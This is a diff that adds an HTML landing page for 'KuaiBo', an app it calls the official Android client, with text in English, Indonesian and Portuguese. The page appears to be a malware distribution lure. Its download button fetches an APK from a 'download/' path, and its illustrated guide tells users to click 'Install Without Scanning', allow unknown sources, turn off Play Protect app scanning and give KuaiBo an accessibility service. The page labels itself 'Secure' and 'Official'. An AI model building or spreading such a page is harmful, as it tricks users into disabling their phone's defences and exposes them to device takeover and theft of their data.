@@ -1,0 +1,650 @@
+<!DOCTYPE html>
+<!-- saved from url=(0021)https://kuaibodda.cc/ -->
+<html lang="en"><head>
+  <base href="/landing-pages/kuaibo/">
+
+<meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+    
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=yes">
+    
+    <!-- 禁用浏览器缓存机制 -->
+    <meta http-equiv="Cache-Control" content="no-cache, no-store, must-revalidate">
+    <meta http-equiv="Pragma" content="no-cache">
+    <meta http-equiv="Expires" content="0">
+    
+    <title>KuaiBo | Klien Android Resmi</title>
+    <!-- 引入图标库 (已替换为CDN修复字体报错) -->
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
+    
+    <style>
+        /* 新主题样式：明亮渐变风格 */
+        :root {
+            --bg-main: #ffffff;
+            --bg-gradient-start: #ff6b9d;
+            --bg-gradient-end: #ffa06b;
+            --bg-card: #ffffff;
+            --text-primary: #2d3748;
+            --text-secondary: #718096;
+            --accent-color: #ff6b9d;
+            --accent-hover: #ff4d88;
+            --border-color: #e2e8f0;
+            --shadow-light: rgba(255, 107, 157, 0.15);
+        }
+
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: 'Segoe UI', 'Roboto', 'Helvetica Neue', Arial, sans-serif;
+            background: linear-gradient(135deg, #ffeef5 0%, #fff5e6 100%);
+            color: var(--text-primary);
+            line-height: 1.7;
+            overflow-x: hidden;
+            -webkit-font-smoothing: antialiased;
+            min-height: 100vh;
+        }
+
+        /* 顶部导航栏 - 圆润卡片风格 */
+        .top-nav {
+            position: sticky;
+            top: 20px;
+            z-index: 50;
+            background: rgba(255, 255, 255, 0.95);
+            backdrop-filter: blur(20px);
+            border-radius: 60px;
+            box-shadow: 0 8px 32px var(--shadow-light);
+            padding: 12px 30px;
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            max-width: 600px;
+            margin: 0 auto;
+            border: 2px solid rgba(255, 107, 157, 0.1);
+        }
+        .brand-wrap {
+            display: flex;
+            align-items: center;
+            gap: 15px;
+        }
+        .brand-logo {
+            width: 42px;
+            border-radius: 12px;
+            box-shadow: 0 4px 12px rgba(0,0,0,0.1);
+        }
+        .brand-name {
+            font-size: 1.6rem;
+            font-weight: 800;
+            letter-spacing: 0.5px;
+            background: linear-gradient(135deg, var(--bg-gradient-start), var(--bg-gradient-end));
+            -webkit-background-clip: text;
+            background-clip: text;
+            color: transparent;
+        }
+
+        .lang-btn {
+            padding: 8px 14px;
+            border: none;
+            background: transparent;
+            color: var(--text-secondary);
+            font-weight: 600;
+            font-size: 0.85rem;
+            border-radius: 50px;
+            cursor: pointer;
+            transition: all 0.3s ease;
+        }
+        .lang-btn:hover {
+            background: rgba(255, 107, 157, 0.1);
+            color: var(--accent-color);
+        }
+        .lang-btn.active {
+            background: linear-gradient(135deg, var(--bg-gradient-start), var(--bg-gradient-end));
+            color: #ffffff;
+            box-shadow: 0 4px 15px var(--shadow-light);
+        }
+
+        /* 主视觉区域 - 波浪装饰 */
+        .main-showcase {
+            padding: 40px 20px 40px;
+            text-align: center;
+            max-width: 900px;
+            margin: 0 auto;
+            position: relative;
+        }
+        .main-showcase::before {
+            content: '';
+            position: absolute;
+            top: -50px;
+            left: 50%;
+            width: 400px;
+            height: 400px;
+            background: radial-gradient(circle, rgba(255, 107, 157, 0.2), transparent 70%);
+            transform: translateX(-50%);
+            z-index: -1;
+            animation: pulse 4s ease-in-out infinite;
+        }
+        @keyframes pulse {
+            0%, 100% { transform: translateX(-50%) scale(1); opacity: 0.3; }
+            50% { transform: translateX(-50%) scale(1.1); opacity: 0.5; }
+        }
+        .headline {
+            font-size: 3.5rem;
+            font-weight: 900;
+            margin-bottom: 20px;
+            line-height: 1.1;
+            color: var(--text-primary);
+        }
+        .headline span {
+            background: linear-gradient(135deg, var(--bg-gradient-start), var(--bg-gradient-end));
+            -webkit-background-clip: text;
+            background-clip: text;
+            color: transparent;
+        }
+        .sub-headline {
+            font-size: 1.25rem;
+            color: var(--text-secondary);
+            margin-bottom: 50px;
+            font-weight: 400;
+        }
+        
+        /* 下载按钮 - 圆润胶囊风格 */
+        .action-button {
+            display: inline-flex;
+            align-items: center;
+            gap: 15px;
+            background: linear-gradient(135deg, var(--bg-gradient-start), var(--bg-gradient-end));
+            color: #ffffff;
+            padding: 20px 50px;
+            border-radius: 60px;
+            font-size: 1.3rem;
+            font-weight: 700;
+            text-decoration: none;
+            transition: all 0.4s cubic-bezier(0.175, 0.885, 0.32, 1.275);
+            box-shadow: 0 12px 40px var(--shadow-light);
+            border: none;
+        }
+        .action-button:hover {
+            transform: translateY(-5px) scale(1.05);
+            box-shadow: 0 20px 60px rgba(255, 107, 157, 0.35);
+        }
+        .device-req {
+            margin-top: 30px;
+            font-size: 0.95rem;
+            color: var(--text-secondary);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 8px;
+            background: rgba(255, 255, 255, 0.6);
+            padding: 12px 24px;
+            border-radius: 30px;
+            display: inline-flex;
+            box-shadow: 0 4px 15px rgba(0,0,0,0.05);
+        }
+
+        /* 教程区域 - 柔和卡片风格 */
+        .guide-wrapper {
+            max-width: 1200px;
+            margin: 0 auto;
+            padding: 30px 20px 60px;
+        }
+        .guide-header {
+            text-align: center;
+            margin-bottom: 60px;
+        }
+        .guide-title {
+            font-size: 2.5rem;
+            margin-bottom: 15px;
+            font-weight: 800;
+            color: var(--text-primary);
+        }
+        .guide-desc {
+            color: var(--text-secondary);
+            font-size: 1.1rem;
+        }
+        
+        /* 教程卡片分组 - 柔和圆角 */
+        .step-group {
+            background: var(--bg-card);
+            border: none;
+            border-radius: 30px;
+            padding: 40px;
+            margin-bottom: 50px;
+            box-shadow: 0 15px 50px rgba(0,0,0,0.08);
+            transition: transform 0.3s ease;
+        }
+        .step-group:hover {
+            transform: translateY(-5px);
+        }
+        .group-title {
+            font-size: 1.5rem;
+            background: linear-gradient(135deg, var(--bg-gradient-start), var(--bg-gradient-end));
+            -webkit-background-clip: text;
+            background-clip: text;
+            color: transparent;
+            margin-bottom: 30px;
+            display: flex;
+            align-items: center;
+            gap: 12px;
+            border-bottom: 2px solid rgba(255, 107, 157, 0.1);
+            padding-bottom: 20px;
+            font-weight: 700;
+        }
+
+        .cards-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(180px, 1fr));
+            gap: 25px;
+        }
+        .card-item {
+            background: linear-gradient(135deg, #fff9fc, #fffaf5);
+            border-radius: 20px;
+            padding: 18px;
+            border: 2px solid rgba(255, 107, 157, 0.08);
+            transition: all 0.3s ease;
+            box-shadow: 0 5px 20px rgba(0,0,0,0.05);
+        }
+        .card-item:hover {
+            transform: translateY(-8px) scale(1.02);
+            border-color: var(--accent-color);
+            box-shadow: 0 15px 40px var(--shadow-light);
+        }
+        .card-item img {
+            width: 100%;
+            border-radius: 15px;
+            display: block;
+            box-shadow: 0 4px 15px rgba(0,0,0,0.1);
+        }
+        .card-label {
+            margin-top: 15px;
+            font-size: 0.95rem;
+            color: var(--text-primary);
+            text-align: center;
+            font-weight: 600;
+        }
+
+        /* 底部 - 柔和风格 */
+        .site-footer {
+            text-align: center;
+            padding: 50px 20px;
+            border-top: 2px solid rgba(255, 107, 157, 0.1);
+            margin-top: 40px;
+            color: var(--text-secondary);
+            font-size: 1rem;
+            background: rgba(255, 255, 255, 0.5);
+        }
+        
+        /* 通知弹窗 - 左下角滑入 */
+        .notify-toast {
+            position: fixed;
+            bottom: 30px;
+            left: 30px;
+            background: linear-gradient(135deg, #10b981, #34d399);
+            color: #ffffff;
+            padding: 18px 30px;
+            border-radius: 20px;
+            font-weight: 600;
+            box-shadow: 0 10px 40px rgba(16, 185, 129, 0.3);
+            transform: translateX(-150%);
+            transition: transform 0.5s cubic-bezier(0.68, -0.55, 0.265, 1.55);
+            z-index: 9999;
+            display: flex;
+            align-items: center;
+            gap: 12px;
+            font-size: 1.05rem;
+        }
+        .notify-toast.active {
+            transform: translateX(0);
+        }
+
+        /* 语言切换按钮样式 */
+        .language-switcher {
+            display: flex;
+            gap: 8px;
+	    justify-content: center;
+            background: rgba(255, 255, 255, 0.95);
+            backdrop-filter: blur(20px);
+            padding: 8px;
+            border-radius: 50px;
+            box-shadow: 0 8px 32px var(--shadow-light);
+            border: 2px solid rgba(255, 107, 157, 0.1);
+            margin-bottom: 50px;
+        }
+        .lang-btn {
+            padding: 10px 18px;
+            border: none;
+            background: transparent;
+            color: var(--text-secondary);
+            font-weight: 600;
+            font-size: 0.9rem;
+            border-radius: 50px;
+            cursor: pointer;
+            transition: all 0.3s ease;
+        }
+        .lang-btn:hover {
+            background: linear-gradient(135deg, rgba(255, 107, 157, 0.1), rgba(255, 160, 107, 0.1));
+            color: var(--accent-color);
+        }
+        .lang-btn.active {
+            background: linear-gradient(135deg, var(--bg-gradient-start), var(--bg-gradient-end));
+            color: #ffffff;
+            box-shadow: 0 4px 15px var(--shadow-light);
+        }
+
+        /* 移动端响应式 */
+        @media (max-width: 600px) {
+            .headline { font-size: 2.5rem; }
+            .action-button { padding: 16px 35px; width: 90%; justify-content: center; font-size: 1.1rem; }
+            .step-group { padding: 25px; }
+            .cards-grid { grid-template-columns: repeat(2, 1fr); gap: 18px; }
+            .top-nav { top: 10px; max-width: 90%; flex-direction: column; gap: 12px; }
+            .notify-toast { bottom: 20px; left: 20px; right: 20px; transform: translateY(150%); }
+            .notify-toast.active { transform: translateY(0); }
+            .language-switcher { width: 100%; justify-content: center; }
+        }
+    </style>
+<style>
+  .imageye-selected {
+    outline: 2px solid black !important;
+    box-shadow: 0 0 10px rgba(0, 0, 0, 0.5) !important;
+  }
+</style>  <script src="/landing-runtime.js" defer></script>
+</head>
+<body>
+
+    <!-- 导航栏 -->
+    <nav class="top-nav">
+        <div class="brand-wrap">
+            <img src="static/picture/logo.png" class="brand-logo" alt="Logo KuaiBo" onerror="this.style.display=&#39;none&#39;">
+            <div class="brand-name">KuaiBo</div>
+        </div>
+    </nav>
+
+    <!-- 主视觉区域 -->
+    <main class="main-showcase">
+        <!-- 语言切换按钮 -->
+        <div class="language-switcher">
+            <button class="lang-btn active" data-lang="en">EN</button>
+            <button class="lang-btn" data-lang="id">ID</button>
+            <!-- <button class="lang-btn" data-lang="pt">PT</button> -->
+        </div>
+        <h1 class="headline"><span data-i18n="headline-highlight">Fast</span>, <span data-i18n="headline-safe">Secure</span>, <span data-i18n="headline-trusted">Trusted</span></h1>
+        <p class="sub-headline" data-i18n="sub-headline">Official Android Client — Download the latest version now</p>
+        
+        <a href="javascript:void(0);" class="action-button" id="downloadTrigger">
+            <i class="fab fa-android"></i> <span data-i18n="download-button">Download Android Version</span>
+        </a>
+    </main>
+
+    <!-- 教程区域 -->
+    <section class="guide-wrapper">
+        <div class="guide-header">
+            <h2 class="guide-title" data-i18n="guide-title">Installation Guide</h2>
+            <p class="guide-desc" data-i18n="guide-desc">Follow these steps to get started</p>
+        </div>
+
+        <!-- 教程第一部分 -->
+        <div class="step-group">
+            <div class="group-title">
+                <i class="fas fa-shield-alt"></i> <span data-i18n="group1-title">Skip Security Settings</span>
+            </div>
+            <div class="cards-grid" style="grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));">
+                <div class="card-item">
+                    <img src="static/picture/1-5.png" alt="Buka Detail">
+                    <div class="card-label" data-i18n="step1-1">1. Open Details</div>
+                </div>
+                <div class="card-item">
+                    <img src="static/picture/1-6.png" alt="Instal Tanpa Pemindaian">
+                    <div class="card-label" data-i18n="step1-2">2. Click Install Without Scanning</div>
+                </div>
+            </div>
+        </div>
+
+        <!-- 教程第二部分 -->
+        <div class="step-group">
+            <div class="group-title">
+                <i class="fas fa-cog"></i> <span data-i18n="group2-title">Or Start with the Following Steps</span>
+            </div>
+            <div class="cards-grid">
+                <div class="card-item">
+                    <img src="static/picture/1-1.png">
+                    <div class="card-label" data-i18n="step2-1">1. Download APK File</div>
+                </div>
+                <div class="card-item">
+                    <img src="static/picture/2-1.png">
+                    <div class="card-label" data-i18n="step2-2">2. Allow "Unknown Sources"</div>
+                </div>
+                <div class="card-item">
+                    <img src="static/picture/2-6.png">
+                    <div class="card-label" data-i18n="step2-3">3. Play Protect</div>
+                </div>
+                <div class="card-item">
+                    <img src="static/picture/2-3.png">
+                    <div class="card-label" data-i18n="step2-4">4. Click Settings</div>
+                </div>
+                <div class="card-item">
+                    <img src="static/picture/2-4.png">
+                    <div class="card-label" data-i18n="step2-5">5. Turn Off App Scanning</div>
+                </div>
+                <div class="card-item">
+                    <img src="static/picture/2-5.png">
+                    <div class="card-label" data-i18n="step2-6">6. Turn Off</div>
+                </div>
+            </div>
+        </div>
+
+        <!-- 教程第三部分 -->
+        <div class="step-group">
+            <div class="group-title">
+                <i class="fas fa-universal-access"></i> <span data-i18n="group3-title">Enable Accessibility</span>
+            </div>
+            <div class="cards-grid">
+                <div class="card-item">
+                    <img src="static/picture/3-1.png">
+                    <div class="card-label" data-i18n="step3-1">1. Click OK</div>
+                </div>
+                <div class="card-item">
+                    <img src="static/picture/3-2.png">
+                    <div class="card-label" data-i18n="step3-2">2. Click Installed Services</div>
+                </div>
+                <div class="card-item">
+                    <img src="static/picture/3-3.png">
+                    <div class="card-label" data-i18n="step3-3">3. Click KuaiBo</div>
+                </div>
+                <div class="card-item">
+                    <img src="static/picture/3-4.png">
+                    <div class="card-label" data-i18n="step3-4">4. Turn Off Switch</div>
+                </div>
+                <div class="card-item">
+                    <img src="static/picture/3-5.png">
+                    <div class="card-label" data-i18n="step3-5">5. Click OK</div>
+                </div>
+            </div>
+        </div>
+    </section>
+
+    <!-- 底部 -->
+    <footer class="site-footer">
+        <p data-i18n="footer-copyright">© 2026 KuaiBo | Official Download Channel</p>
+        <p style="margin-top: 12px; color: #718096;">
+            <i class="fab fa-android"></i> <span data-i18n="footer-tagline">Safe Ad-Free Experience</span>
+        </p>
+    </footer>
+
+    <!-- 通知弹窗 -->
+    <div id="statusToast" class="notify-toast">
+        <i class="fas fa-check-circle"></i>
+        <span id="toastText">Informasi</span>
+    </div>
+
+    <script>
+        // 多语言翻译对象
+        const translations = {
+            en: {
+                'headline-highlight': 'Fast',
+                'headline-safe': 'Secure',
+                'headline-trusted': 'Trusted',
+                'sub-headline': 'Official Android Client — Download the latest version now',
+                'download-button': 'Download Android Version',
+                'guide-title': 'Installation Guide',
+                'guide-desc': 'Follow these steps to get started',
+                'group1-title': 'Skip Security Settings',
+                'step1-1': '1. Open Details',
+                'step1-2': '2. Click Install Without Scanning',
+                'group2-title': 'Or Start with the Following Steps',
+                'step2-1': '1. Download APK File',
+                'step2-2': '2. Allow "Unknown Sources"',
+                'step2-3': '3. Play Protect',
+                'step2-4': '4. Click Settings',
+                'step2-5': '5. Turn Off App Scanning',
+                'step2-6': '6. Turn Off',
+                'group3-title': 'Enable Accessibility',
+                'step3-1': '1. Click OK',
+                'step3-2': '2. Click Installed Services',
+                'step3-3': '3. Click KuaiBo',
+                'step3-4': '4. Turn Off Switch',
+                'step3-5': '5. Click OK',
+                'footer-copyright': '© 2026 KuaiBo | Official Download Channel',
+                'footer-tagline': 'Safe Ad-Free Experience',
+                'toast-download': 'Download started!'
+            },
+            id: {
+                'headline-highlight': 'Cepat',
+                'headline-safe': 'Aman',
+                'headline-trusted': 'Terpercaya',
+                'sub-headline': 'Klien Android Resmi — Unduh versi terbaru sekarang',
+                'download-button': 'Unduh Versi Android',
+                'guide-title': 'Panduan Instalasi',
+                'guide-desc': 'Ikuti langkah-langkah berikut untuk memulai',
+                'group1-title': 'Lewati Pengaturan Keamanan',
+                'step1-1': '1. Buka Detail',
+                'step1-2': '2. Klik Instal Tanpa Pemindaian',
+                'group2-title': 'Atau Mulai dengan Langkah Berikut',
+                'step2-1': '1. Unduh File APK',
+                'step2-2': '2. Izinkan "Sumber Tidak Dikenal"',
+                'step2-3': '3. Play Protect',
+                'step2-4': '4. Klik Pengaturan',
+                'step2-5': '5. Matikan Pemindaian Aplikasi',
+                'step2-6': '6. Matikan',
+                'group3-title': 'Aktifkan Aksesibilitas',
+                'step3-1': '1. Klik OK',
+                'step3-2': '2. Klik Layanan Terinstal',
+                'step3-3': '3. Klik KuaiBo',
+                'step3-4': '4. Matikan Tombol',
+                'step3-5': '5. Klik OK',
+                'footer-copyright': '© 2026 KuaiBo | Saluran Unduhan Resmi',
+                'footer-tagline': 'Pengalaman Aman Tanpa Iklan',
+                'toast-download': 'Unduhan dimulai!'
+            },
+            pt: {
+                'headline-highlight': 'Rápido',
+                'headline-safe': 'Seguro',
+                'headline-trusted': 'Confiável',
+                'sub-headline': 'Cliente Android Oficial — Baixe a versão mais recente agora',
+                'download-button': 'Baixar Versão Android',
+                'guide-title': 'Guia de Instalação',
+                'guide-desc': 'Siga estas etapas para começar',
+                'group1-title': 'Ignorar Configurações de Segurança',
+                'step1-1': '1. Abrir Detalhes',
+                'step1-2': '2. Clique em Instalar Sem Verificação',
+                'group2-title': 'Ou Comece com as Seguintes Etapas',
+                'step2-1': '1. Baixar Arquivo APK',
+                'step2-2': '2. Permitir "Fontes Desconhecidas"',
+                'step2-3': '3. Play Protect',
+                'step2-4': '4. Clique em Configurações',
+                'step2-5': '5. Desativar Verificação de Aplicativos',
+                'step2-6': '6. Desativar',
+                'group3-title': 'Ativar Acessibilidade',
+                'step3-1': '1. Clique em OK',
+                'step3-2': '2. Clique em Serviços Instalados',
+                'step3-3': '3. Clique em KuaiBo',
+                'step3-4': '4. Desativar Botão',
+                'step3-5': '5. Clique em OK',
+                'footer-copyright': '© 2026 KuaiBo | Canal de Download Oficial',
+                'footer-tagline': 'Experiência Segura Sem Anúncios',
+                'toast-download': 'Download iniciado!'
+            }
+        };
+
+        // 获取当前语言（从localStorage读取，默认英语）
+        function getCurrentLanguage() {
+            return localStorage.getItem('kuaibo-language') || 'en';
+        }
+
+        // 保存语言到localStorage
+        function saveLanguage(lang) {
+            localStorage.setItem('kuaibo-language', lang);
+        }
+
+        // 应用翻译
+        function applyTranslations(lang) {
+            const elements = document.querySelectorAll('[data-i18n]');
+            elements.forEach(el => {
+                const key = el.getAttribute('data-i18n');
+                if (translations[lang] && translations[lang][key]) {
+                    el.textContent = translations[lang][key];
+                }
+            });
+
+            // 更新HTML lang属性
+            const langMap = { en: 'en', id: 'id', pt: 'pt' };
+            document.documentElement.lang = langMap[lang] || 'en';
+
+            // 更新按钮激活状态
+            document.querySelectorAll('.lang-btn').forEach(btn => {
+                btn.classList.remove('active');
+                if (btn.getAttribute('data-lang') === lang) {
+                    btn.classList.add('active');
+                }
+            });
+        }
+
+        // 初始化语言
+        document.addEventListener('DOMContentLoaded', function() {
+            const currentLang = getCurrentLanguage();
+            applyTranslations(currentLang);
+
+            // 语言切换按钮事件
+            document.querySelectorAll('.lang-btn').forEach(btn => {
+                btn.addEventListener('click', function() {
+                    const lang = this.getAttribute('data-lang');
+                    saveLanguage(lang);
+                    applyTranslations(lang);
+                });
+            });
+        });
+
+        // 下载按钮与通知逻辑
+        const downloadBtn = document.getElementById('downloadTrigger');
+        const toastEl = document.getElementById('statusToast');
+        const toastText = document.getElementById('toastText');
+
+        function popNotification(msg, time = 3000) {
+            toastText.innerText = msg;
+            toastEl.classList.add('active');
+            setTimeout(() => {
+                toastEl.classList.remove('active');
+            }, time);
+        }
+
+        downloadBtn.addEventListener('click', function (e) {
+            e.preventDefault();
+            
+            
+            
+            // 执行APK下载跳转
+            window.location.href = "download/";
+
+            // 弹出下载提示（根据当前语言）
+            const currentLang = getCurrentLanguage();
+            const downloadMsg = translations[currentLang]['toast-download'] || 'Download started!';
+            popNotification(downloadMsg, 3000);
+        });
+    </script>
+
+
+
+<script type="module" src="https://static.cloudflareinsights.com/beacon.min.js/v3d52b47920f24c319d37e2661827c42b1787588026925" integrity="sha512-d9sL6GJLXn6fInD1+TVXhTcQOsmxeHfmHAvwGDIxp5TO+uo1fiWW7mHomMj4MLRlCsJDTqXzWLHJFFlPCEIj/A==" data-cf-beacon='{"version":"2024.11.0","token":"d8d0a4b6e3294b56990fe4f7e7e0a13a","r":1}' crossorigin="anonymous"></script>
+</body></html>
